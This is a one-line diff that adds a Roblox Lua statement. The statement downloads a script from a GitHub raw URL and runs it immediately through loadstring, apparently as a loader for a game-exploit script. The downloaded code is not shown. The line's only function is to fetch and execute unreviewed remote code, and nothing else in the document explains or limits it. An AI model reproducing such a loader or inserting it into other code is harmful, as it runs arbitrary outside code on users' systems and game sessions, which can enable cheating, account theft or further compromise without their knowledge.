@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ivanko1202/Bambunu/main/4.lua"))()
